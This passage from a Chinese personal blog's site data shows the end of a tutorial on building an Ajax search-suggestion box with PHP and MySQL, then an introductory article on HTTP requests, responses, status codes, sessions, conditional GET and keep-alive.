class=\"keyword\">key</span>,</span><br><span class=\"line\"><span class=\"keyword\">data</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span></span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">1</span>,<span class=\"string\">'ALin'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">2</span>,<span class=\"string\">'Amy'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">3</span>,<span class=\"string\">'Brittany'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">4</span>,<span class=\"string\">'Bully'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">5</span>,<span class=\"string\">'Eve'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">6</span>,<span class=\"string\">'Evita'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">7</span>,<span class=\"string\">'Eva'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">8</span>,<span class=\"string\">'Amanda'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">9</span>,<span class=\"string\">'Ellen'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">10</span>,<span class=\"string\">'Elizabeth'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">11</span>,<span class=\"string\">'Anna'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">12</span>,<span class=\"string\">'Abel'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">13</span>,<span class=\"string\">'Addison'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">14</span>,<span class=\"string\">'Alan'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">15</span>,<span class=\"string\">'Alfred'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">16</span>,<span class=\"string\">'Alger'</span>);</span><br><span class=\"line\"><span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> myData <span class=\"keyword\">values</span> (<span class=\"number\">17</span>,<span class=\"string\">'Allen'</span>);</span><br></pre></td></tr></table></figure>\n<p>接着我使用 php 来访问数据库并执行 sql 语句，创建一个 createdb.php, 编写如下代码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$servername = <span class=\"string\">'your servername'</span>;</span><br><span class=\"line\">$username = <span class=\"string\">'your username'</span>;</span><br><span class=\"line\">$password = <span class=\"string\">'your password'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$con = <span class=\"keyword\">new</span> mysqli($servername,$username,$password);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$con)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Can't find the database.\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$sql = file_get_contents(<span class=\"string\">'create.sql'</span>);</span><br><span class=\"line\">$con-&gt;multi_query($sql);</span><br></pre></td></tr></table></figure>\n<p>这时候数据就已经创建成功了，接着可以从终端查看添加的数据:</p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/3.png\" alt=\"\"></p>\n<p>数据创建好后就可以开始编写 Javascript 代码了。</p>\n<h2 id=\"Ajax-请求部分：\"><a href=\"#Ajax-请求部分：\" class=\"headerlink\" title=\"Ajax 请求部分：\"></a>Ajax 请求部分：</h2><p>创建一个 search.js 文件，然后引入到 body 底部表单之后。 </p>\n<p>在 js 代码中，首先创建封装好的 Ajax 对象函数，代码如下：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getAjaxObject</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> request;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">window</span>.XMLHttpRequest)&#123;</span><br><span class=\"line\">        request = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        request = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">'Microsoft.XMLHTTP'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> request;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>之后在编写回调函数，代码如下： </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">callback</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request.readyState === <span class=\"number\">4</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (request.status === <span class=\"number\">200</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> result = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">'div'</span>);</span><br><span class=\"line\">            result.id = <span class=\"string\">'result'</span>;</span><br><span class=\"line\">            <span class=\"built_in\">document</span>.body.appendChild(result);</span><br><span class=\"line\">            <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>).innerHTML += request.responseText;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong>这里动态创建一个 div，并且将后台返回的数据添加到 div 中，再将此 div 添加到 body 中。</strong></p>\n<p>之后就可以创建一个 showHint 函数用来发送 AJax 请求，代码如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> request = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">showHint</span>(<span class=\"params\">val</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> result = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">'result'</span>);</span><br><span class=\"line\">        result.parentNode.removeChild(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (val.length == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    request = getAjaxObject();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request === <span class=\"literal\">null</span>)&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"Your browser doesn't support AJax\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    request.onreadystatechange = callback;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> url = <span class=\"string\">'getHint.php?q='</span> + val;</span><br><span class=\"line\">    request.open(<span class=\"string\">'GET'</span>,url,<span class=\"literal\">true</span>);</span><br><span class=\"line\">    request.send();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>之后将 onkeyup=”showHint(this.value)” 添加到属性为 text 的 input 标签中，即：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text\"</span> <span class=\"attr\">id</span>=<span class=\"string\">\"search\"</span> <span class=\"attr\">onkeyup</span>=<span class=\"string\">\"showHint(this.value)\"</span> /&gt;</span></span><br></pre></td></tr></table></figure>\n<p>这样每当数据一个字符的时候，将调用一次 showHint 函数用来发起 AJax 请求，达到每次输入每次查询的效果。</p>\n<h2 id=\"后台部分：\"><a href=\"#后台部分：\" class=\"headerlink\" title=\"后台部分：\"></a>后台部分：</h2><p>创建一个getHint.php文件，编写如下代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$servername = <span class=\"string\">'your servername'</span>;</span><br><span class=\"line\">$username = <span class=\"string\">'your username'</span>;</span><br><span class=\"line\">$password = <span class=\"string\">'your password'</span>;</span><br><span class=\"line\">$db = <span class=\"string\">'baidu_search'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$con = <span class=\"keyword\">new</span> mysqli($servername,$username,$password);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$con)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Can't find the database.\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$con-&gt;select_db($db);</span><br><span class=\"line\"></span><br><span class=\"line\">$sql = <span class=\"string\">\"Select * from myData;\"</span>;</span><br><span class=\"line\">$result = $con-&gt;query($sql);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span>($row = $result-&gt;fetch_array())&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strtolower($q) == strtolower(substr($row[<span class=\"string\">'data'</span>],<span class=\"number\">0</span>,strlen($q))))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;a href='#'&gt;\"</span>.$row[<span class=\"string\">'data'</span>].<span class=\"string\">\"&lt;/a&gt;&lt;br&gt;\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/p&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>自此前后端已经可以正常的发起搜索功能。</p>\n<h2 id=\"美化搜索框：\"><a href=\"#美化搜索框：\" class=\"headerlink\" title=\"美化搜索框：\"></a>美化搜索框：</h2><p>在 basic.css 中添加一些样式：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-id\">#result</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-align</span>: left;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">535px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: relative;</span><br><span class=\"line\">    <span class=\"attribute\">margin-left</span>: <span class=\"number\">310px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid <span class=\"number\">#b8b8b8</span>;</span><br><span class=\"line\">    <span class=\"attribute\">box-shadow</span>: <span class=\"number\">1px</span> <span class=\"number\">1px</span> <span class=\"number\">1px</span> <span class=\"number\">1px</span> <span class=\"number\">#eeeeee</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#result</span> &gt; <span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#result</span> <span class=\"selector-tag\">p</span> &gt; <span class=\"selector-tag\">a</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">text-decoration</span>: none;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">line-height</span>: <span class=\"number\">25px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">font-size</span>: <span class=\"number\">25px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-id\">#result</span> <span class=\"selector-tag\">p</span><span class=\"selector-pseudo\">:hover</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">cursor</span>: pointer;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"number\">#eee</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"最终效果：\"><a href=\"#最终效果：\" class=\"headerlink\" title=\"最终效果：\"></a>最终效果：</h2><p><img src=\"/assets/2016-03-01-ajax-baidu-search/4.png\" alt=\"\"></p>\n<p><img src=\"/assets/2016-03-01-ajax-baidu-search/5.png\" alt=\"\"></p>\n"},{"layout":"post","title":"浅谈 HTTP 协议","date":"2016-03-02T04:00:00.000Z","author":"Lindz","header-img":"img/8.jpg","_content":"\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n作为一个 Weber，掌握必要的 HTTP/TCP 等协议十分必要。自从上学期学习了计算机网络，对于网络这一块有了一定的了解，再加上网上学习到的知识，通过本文记录自己对 HTTP 协议的理解。\n\n首先让我们从一个问题入手，当我们在浏览器中输入 http://www.baidu.com 访问百度的时候浏览器做了哪些事情。(这里以 Chrome 浏览器为例)\n\n1. 首先 Chrome 搜索自身的 DNS 缓存。(如果 DNS 缓存中找到百度的 IP 地址，就跳过了接下来查找 IP 地址步骤，直接访问该 IP 地址。)       \n2. 搜索操作系统自身的 DNS 缓存。(浏览器没有找到缓存或者缓存已经失效)\n3. 读取本身的 HOST 文件。(如果前1.2步骤都没有找到)\n4. 浏览器向宽带运营商服务器或者域名服务器发起一个 DNS 解析请求。 \n服务器先查看本身的缓存，若找到则返回百度首页的 IP 地址，若没有找到，则服务器就发起一个迭代 DNS 解析的请求，如下图：  \n![](/assets/2016-03-02-talk-http/1.png)  \n从图中我们可以看出域名服务器先向根域名服务器发起DNS解析请求，接着迭代发起请求，直到找到所搜索的百度首页的 IP 地址，并将它返回给浏览器。     \n5. 拿到 IP 地址后，浏览器就向该 IP 所在的服务器发起 TCP 连接(即三次握手)。      \n6. 连接建立起来之后，浏览器就可以向服务器发起 HTTP 请求了。(这里比如访问百度首页，就向服务器发起 HTTP 中的 GET 请求)     \n7. 服务器接受到这个请求后，根据路径参数，经过后台一些处理之后，把处理后的结果返回给浏览器，如果是百度首页，就可以把完整的 HTML 页面代码返回给浏览器。      \n8. 浏览器拿到了百度首页的完整 HTML 页面代码，内核和 JS 引擎就会解析和渲染这个页面，里面的 JS，CSS，图片等静态资源也通过一个个 HTTP 请求进行加载。     \n9. 浏览器根据拿到的资源对页面进行渲染，最终把完整的页面呈现给用户。     \n10. 如果浏览器没有后续的请求，那么就会跟服务器端发起 TCP 断开(即四次挥手)。    \n\n至此，整个访问过程就结束了，这里只是简单的概括，实际情况远比这些复杂。\n\n## HTTP 概念\n\n> 超文本传输协议（HTTP，HyperText Transfer Protocol)是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。 \n\n举个可能不太恰当的例子，TCP 就好比端与端之间沟通的桥梁，而 HTTP 就像是一个搬运工，通过这个桥梁搬运资源。  \n\n### HTTP 特性： \n\n* HTTP 构建于 TCP/IP 协议之上，默认端口号是 80\n* HTTP 是无连接无状态的\n\nHTTP 分为两个部分：请求和响应。\n\n## HTTP 内容\n\n### HTTP 请求：\n\nHTTP 定义了在与服务器交互的不同方式，最常用的方法有 4 种，分别是 GET，POST，PUT， DELETE。URL 全称为资源描述符，可以这么认为：一个 URL 地址，对应着一个网络上的资源，而 HTTP 中的 GET，POST，PUT，DELETE 就对应着对这个资源的查询，修改，增添，删除4个操作。\n\nHTTP 请求由 3 个部分构成，分别是：状态行，请求头(Request Header)，请求正文。\n\n> 状态行由协议，状态描述等构成，各元素之间以空格分隔。\n   \n> 请求头提供一些参数比如：Cookie，用户代理信息，主机名等等。  \n \n> 请求正文就放一些发送的数据，一般 GET 请求会将参数放在 URL 中，也就是在请求头中而请求正文一般为空，而 POST 请求将参数放在请求正文中。\n\n* GET 一般用于信息获取，比如刚才我们浏览百度首页，其使用的就是GET方法。\n  \nGET请求报文实例：  \n![](/assets/2016-03-02-talk-http/2.png)\n\n\nGET 请求一般不会产生副作用，它仅仅只是获取资源信息，就像数据库查询一样，不会修改、增加数据，不会影响资源的状态，并且对同一个 URL 的多次GET请求应该返回相同的结果。\n\n* POST 请求表示可能会修改服务器上的资源。  \n![](/assets/2016-03-02-talk-http/3.png)\n\n注：  \n\n1. GET 和 POST 请求参数位置不同，从上面两个请求报文可以看出，GET 请求对应的参数放在 URL 中，而 POST 请求对应的参数放在 HTTP 请求主体中。  \n2. GET 可提交的数据量受 URL 长度的限制，而 POST 的数据量则没有限制。\n3. 处于安全考虑，在一些涉及安全的请求比如：登录请求需要用 POST 提交表单，而GET 请求一般用来获取静态资源。\n\n### HTTP 响应：\n\nHTTP 响应是服务器在客户端发送 HTTP 请求后经过一些处理而做出的响应，HTTP 响应和 HTTP 请求相似，也是由三个部分构成。分别是：状态行，响应头(Response Header)，响应正文。\n\nHTTP 响应中包含一个状态码，用来表示服务器对客户端响应的结果。  \n\n状态码一般由3位构成： \n \n* 1xx : 表示请求已经接受了，继续处理。   \n* 2xx : 表示请求已经处理掉了。  \n* 3xx : 重定向。  \n* 4xx : 一般表示客户端有错误，请求无法实现。  \n* 5xx : 一般为服务器端的错误。\n  \n比较常用的状态码：  \n\n* 200 OK 客户端请求成功。 \n* 301 Moved Permanently 请求永久重定向。\n* 302 Moved Temporarily 请求临时重定向。\n* 304 Not Modified 文件未修改，可以直接使用缓存的文件。\n* 400 Bad Request 由于客户端请求有语法错误，不能被服务器所理解。\n* 401 Unauthonzed 请求未经授权，无法访问。\n* 403 Forbidden 服务器收到请求，但是拒绝提供服务。服务器通常会在响应正文中给出不提供服务的原因。\n* 404 Not Found 请求的资源不存在，比如输入了错误的URL。\n* 500 Internal Server Error 服务器发生不可预期的错误，导致无法完成客户端的请求。\n* 503 Service Unavailable 服务器当前不能够处理客户端的请求，在一段时间之后，服务器可能会恢复正常。\n\n下面是一个 HTTP 响应的例子：\n![](/assets/2016-03-02-talk-http/4.png)\n\n\n知道了 HTTP 请求和响应后，一个完整的流程一般是这样的：\n\n通常，由 HTTP 客户端发起一个请求，建立一个到服务器指定端口（默认是 80 端口）的 TCP 连接。HTTP 服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如\"HTTP/1.1 200 OK\"，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。\n  \n> HTTP 使用 TCP 而不是 UDP 的原因在于（打开）一个网页必须传送很多数据，而 TCP 协议提供传输控制，按顺序组织数据，和错误纠正。\n\n## 其它\n\n了解以上那些概念后，已经对 HTTP 协议有了大致的了解了。下面介绍一些 HTTP 实现中具体内容。\n\n### 会话追踪\n\n* 会话：客户端向服务器端发起请求到服务端响应客户端请求的全过程。\n* 会话跟踪：会话追踪指的是服务器对用户响应的监视。\n\n为什么需要会话跟踪： \n\n> 浏览器与服务器之间的通信是通过 HTTP 协议进行通信的，而 HTTP 协议是”无状态”的协议，它不能保存客户的信息，即一次响应完成之后连接就断开了，下一次的请求需要重新连接，这样就需要判断是否是同一个用户，所以才有会话跟踪技术来实现这种要求。\n\n#### 会话跟踪常用方法：\n\n* URL 重写：URL 重写技术就是在 URL 结尾添加一个附加数据以标识该会话，把会话 ID 通过 URL 的信息传递过去，以便在服务器进行识别不同的用户。\n* 隐藏表单域：将会话ID添加到HTML表单元素中提交到服务器，此表单元素并不在客户端显示。\n* Cookie：Cookie 是 Web 服务器发送给客户端的一小段信息，客户端请求时可以读取该信息发送给服务器端，进而进行用户的识别，对于客户端的每次请求，服务器都会将 Cookie 发送到客户端，客户端保存下来，以便下次使用。\n\n> 客户端可以采用两种方式来保存这个Cookie对象，一种方式是保存在客户端内存中，称为临时Cookie，浏览器关闭后这个Cookie对象将消失。 \n  \n> 另外一种方式是保存在客户机的磁盘上，称为永久Cookie。以后客户端只要访问该网站，就会将这个Cookie再次发送到服务器上，前提是这个Cookie在有效期内，这样就实现了对客户的跟踪。\n\nCookie 是可以被禁止的，当你打开 Chrome，在设置里面关闭 Cookie，那么你将再也无法登录淘宝页面。\n\n* Session：在服务器端会创建一个 session 对象，产生一个 sessionID 来标识这个 session 对象，然后将这个 sessionID 放入到 Cookie 中发送到客户端，下一次访问时，sessionID 会发送到服务器，在服务器端进行识别不同的用户。\n\n> 每一个用户都有一个不同的 session，各个用户之间是不能共享的，是每个用户所独享的，在 session 中可以存放信息。\n   \n> Session的实现依赖于Cookie，如果Cookie被禁用，那么session也将失效。\n\n### 条件 GET：  \n\nHTTP 条件 GET 是 HTTP 协议为了减少不必要的带宽浪费，提出的一种方案。\n  \n1. HTTP 条件 GET 使用时机：客户端之前已经访问过某网站，并打算再次访问该站点。\n2. HTTP 条件 GET 使用的方法：客户端向服务器发送一个包询问是否在上一次访问网站的时间后是否更改了页面，如果服务器没有更新，显然不需要把整个网页传给客户端，客户端只要使用本地缓存即可，如果服务器对照客户端给出的时间已经更新了客户端请求的网页，则发送这个更新了的网页给用户。\n\n下面是一个具体的发送接受报文示例：\n\n客户端发送请求：\n\n![](/assets/2016-03-02-talk-http/5.png)\n\n第一次请求时，服务器端返回请求数据，之后的请求，服务器根据请求中的 If-Modified-Since 字段判断响应文件没有更新，如果没有更新，服务器返回一个 304 Not Modified响应，告诉浏览器请求的资源在浏览器上没有更新，可以使用已缓存的上次获取的文件。\n\n![](/assets/2016-03-02-talk-http/6.png)\n\n如果服务器端资源已经更新的话，就返回正常的响应。\n\n### 持久连接：\n\n我们知道 HTTP 协议采用“请求-应答”模式，当使用普通模式，即非 Keep-Alive 模式时，每个请求/应答客户和服务器都要新建一个连接，完成之后立即断开连接（HTTP协议为无连接的协议）；当使用 Keep-Alive 模式（又称持久连接、连接重用）时，Keep-Alive 功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive 功能避免了建立或者重新建立连接。\n\n在 HTTP 1.0 版本中，并没有官方的标准来规定 Keep-Alive 如何工作，因此实际上它是被附加到 HTTP 1.0协议上，如果客户端浏览器支持 Keep-Alive ，那么就在HTTP请求头中添加一个字段 Connection: Keep-Alive，当服务器收到附带有 Connection: Keep-Alive 的请求时，它也会在响应头中添加一个同样的字段来使用 Keep-Alive 。这样一来，客户端和服务器之间的HTTP连接就会被保持，不会断开（超过 Keep-Alive 规定的时间，意外断电等情况除外），当客户端发送另外一个请求时，就使用这条已经建立的连接。\n\n在 HTTP 1.1 版本中，默认情况下所有连接都被保持，如果加入 \"Connection: close\" 才关闭。目前大部分浏览器都使用 HTTP 1.1 协议，也就是说默认都会发起 Keep-Alive 的连接请求了，所以是否能完成一个完整的 Keep-Alive 连接就看服务器设置情况。\n\n由于 HTTP 1.0 没有官方的 Keep-Alive 规范，并且也已经基本被淘汰，以下讨论均是针对 HTTP 1.1 标准中的 Keep-Alive 展开的。\n\n### 小结：\n\n1. 会话跟踪和条件 GET 是有不同的，它们分别运用于不同的场景。会话跟踪是服务器用来表示标识区分不同的用户，而有条件 GET 则用户多次访问相同的页面，用来减少带宽的浪费，两者有本质上的区别。\n2. HTTP Keep-Alive 简单说就是保持当前的TCP连接，避免了重新建立连接。\n3. HTTP 是一个无状态无连接的协议，那么这是不是与 Keep-Alive 冲突？\n\n个人认为：Keep-Alive 与无连接的特性冲突，而对于无状态的特性两者并无矛盾，HTTP 无状态无连接是在 1.0 版本中就规定的，而 Keep-Alive 则是在 1.1 版本中才被添加入规范。  \n\n无连接的意思是限制每个连接只有一个请求的意思，在服务器处理完客户的请求，并收到客户的反应，即断开。通过这种方式可以节省传输时间。  \n\nKeep-Alive 确实破坏了这一特性，而无状态协议则意味着每个请求都是独立的，互不干扰的，互相没有记忆的。所以才需要有会话跟踪这种机制来识别用户。\n\n\n\n\n参考链接：  \n\n* [http 百度百科](http://baike.baidu.com/link?url=X1CqeVwoptB7-RFAJ6nWteQoTFYHFJYR7FRUhatC4F5amT4HGhZt2WMF--hZS6BaulGQbBgWeAzgNYv7qN8q7a)  \n* [进击Node.js基础（一）技术学习教程 慕课网](http://www.imooc.com/learn/348)  \n* [HTTP 协议 笔试面试知识整理](http://hit-alibaba.github.io/interview/basic/network/HTTP.html)  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/2016-03-02-talk-http.md","raw":"---\nlayout:     post\ntitle:      \"浅谈 HTTP 协议\"\ndate:       2016-03-02 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/8.jpg\"\ntags:\n    - HTTP\n    - 计算机网络\n---\n\n> 本文为原创作品。欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n作为一个 Weber，掌握必要的 HTTP/TCP 等协议十分必要。自从上学期学习了计算机网络，对于网络这一块有了一定的了解，再加上网上学习到的知识，通过本文记录自己对 HTTP 协议的理解。\n\n首先让我们从一个问题入手，当我们在浏览器中输入 http://www.baidu.com 访问百度的时候浏览器做了哪些事情。(这里以 Chrome 浏览器为例)\n\n1. 首先 Chrome 搜索自身的 DNS 缓存。(如果 DNS 缓存中找到百度的 IP 地址，就跳过了接下来查找 IP 地址步骤，直接访问该 IP 地址。)       \n2. 搜索操作系统自身的 DNS 缓存。(浏览器没有找到缓存或者缓存已经失效)\n3. 读取本身的 HOST 文件。(如果前1.2步骤都没有找到)\n4. 浏览器向宽带运营商服务器或者域名服务器发起一个 DNS 解析请求。 \n服务器先查看本身的缓存，若找到则返回百度首页的 IP 地址，若没有找到，则服务器就发起一个迭代 DNS 